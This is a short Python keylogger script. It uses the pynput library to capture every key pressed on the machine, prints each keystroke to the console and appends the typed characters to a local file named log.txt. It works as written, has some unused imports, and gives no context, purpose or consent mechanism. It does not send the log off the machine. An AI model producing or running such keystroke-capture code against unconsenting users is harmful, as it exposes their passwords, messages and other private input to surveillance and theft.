import pynput
from pynput.keyboard import Listener, Key
import pyautogui
import time

charCount = 0
keys = []


def onKeyPress(key):
    global keys, charCount  # Access global variables
    try:
        print('Key Pressed : ', key)  # Print pressed key
    except Exception as ex:
        print('There was an error : ', ex)
    try:
        keys.append(key.char)  # Store the Keys
    except AttributeError:
        keys.append(key)
    charCount += 1  # Count keys pressed


def onKeyRelease(key):
    global keys, charCount  # Access global variables
    if key == Key.enter:  # Write keys to file
        writeToFile("\n")
    writeToFile(keys)
    charCount = 0
    keys = []


def writeToFile(keys):
    with open('log.txt', 'a', encoding="utf-8") as file:
        for key in keys:
            key = str(key).replace("'", "")  # Replace ' with space
            if 'key'.upper() not in key.upper():
                file.write(key)


with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()